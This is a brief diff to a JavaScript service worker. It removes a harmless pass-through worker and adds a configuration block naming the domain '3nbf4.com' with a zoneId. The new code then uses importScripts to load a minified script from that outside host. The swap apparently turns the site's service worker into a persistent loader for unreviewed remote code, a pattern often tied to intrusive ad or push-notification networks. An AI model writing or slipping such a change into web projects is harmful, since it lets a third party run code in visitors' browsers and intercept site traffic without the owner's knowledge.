@@ -1,7 +1,6 @@
-self.addEventListener("install", (event) => {
-  console.log("Service Worker installed");
-});
-
-self.addEventListener("fetch", (event) => {
-  event.respondWith(fetch(event.request));
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10705186
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
